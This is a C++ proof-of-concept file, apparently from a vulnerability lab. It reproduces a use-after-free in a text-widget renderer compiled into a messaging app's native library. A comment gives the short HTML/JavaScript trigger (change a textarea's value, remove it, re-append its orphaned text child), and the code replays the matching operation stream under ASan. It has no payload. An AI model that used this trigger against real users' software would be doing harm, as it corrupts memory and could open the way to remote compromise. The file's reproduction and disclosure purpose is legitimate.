// Host PoC: DOM/bridge UAF through textarea.value + remove + re-insert of the text child.
// Drives the real TwidgetCore (the renderer compiled into libtmessages.49.so) against a
// stub backend, with ASan. The op stream is what the shipped sandbox bundle emits for:
//
//   <textarea id=t>hello</textarea>
//   <script>
//     const c = t.firstChild;
//     t.value = "x";        // prop value -> native clears textarea->children without deleting them
//     t.remove();           // rm     -> textarea Node freed; text child orphaned with parent = freed Node
//     document.body.appendChild(c); // text + ins -> native dereferences the freed parent
//   </script>
//
// Build (from the lab): see build_tw/build_poc.sh
#include "renderer.h"

#include <cstdio>
#include <cstdlib>
#include <string>
#include <vector>

using twidget::Json;
using namespace twlite;

namespace {

struct StubBackend : Backend {
    int next = 0;
    int create_font(const std::string&, float size, int, bool, const std::string&, FontMetrics& out) override {
        out.ascent = size * 0.8f;
        out.descent = size * 0.2f;
        out.height = size * 1.2f;
        out.x_height = size * 0.5f;
        out.zero_width = 8;
        return ++next;
    }
    void delete_font(int) override {}
    float text_width(int, const std::string& text) override { return 8.0f * float(text.size()); }
    bool load_image(int, const std::string&, float&, float&) override { return false; }
    void canvas_run(int, int, int, const std::vector<CanvasOp>&) override {}
    bool canvas_read(int, int, int, int w, int h, std::vector<uint8_t>& rgba) override {
        rgba.assign(size_t(w) * h * 4, 7);
        return true;
    }
};

Json parse(const char* s) {
    auto j = Json::parse(s);
    if (!j) {
        std::printf("bad json: %s\n", s);
        std::exit(2);
    }
    return *j;
}

void send(Renderer& r, const char* json, const char* what) {
    std::printf("== %s\n", what);
    std::fflush(stdout);
    auto out = r.receive(parse(json));
    std::printf("   out messages: %zu\n", out.size());
    std::fflush(stdout);
}

} // namespace

int main() {
    std::setvbuf(stdout, nullptr, _IONBF, 0);
    std::printf("TwidgetCore textarea orphan PoC\n");
    StubBackend backend;
    Renderer r(300, 1, false, backend);

    // What the validator emits for the document before the script runs:
    // html(2) head(3) body(4); textarea(10) with text child(11).
    send(r, R"({"type":"ops","ops":[
      {"op":"el","id":2,"tag":"html","adopt":"html","attrs":[]},
      {"op":"el","id":3,"tag":"head","adopt":"head","attrs":[]},
      {"op":"el","id":4,"tag":"body","adopt":"body","attrs":[]},
      {"op":"el","id":10,"tag":"textarea","attrs":[["id","t"]]},
      {"op":"text","id":11,"data":"hello"},
      {"op":"ins","parent":10,"id":11,"before":null},
      {"op":"ins","parent":4,"id":10,"before":null}
    ]})", "batch 1: initial tree");

    // textarea.value = "x"
    send(r, R"({"type":"ops","ops":[{"op":"prop","id":10,"name":"value","value":"x"}]})",
         "batch 2: prop value (clears textarea->children, child 11 stays in nodes_ with parent=10)");

    // textarea.remove()
    send(r, R"({"type":"ops","ops":[{"op":"rm","id":10}]})",
         "batch 3: rm textarea (Node 10 freed; orphan 11 still points at it)");

    // document.body.appendChild(textChild), the same JS node (sticky id 11): the sandbox emits
    // text 11 (ignored: the id still exists natively) then ins parent=4 id=11.
    send(r, R"({"type":"ops","ops":[{"op":"text","id":11,"data":"hello"},{"op":"ins","parent":4,"id":11,"before":null}]})",
         "batch 4: re-insert orphan -> use-after-free");

    std::printf("done (no ASan report)\n");
    return 0;
}
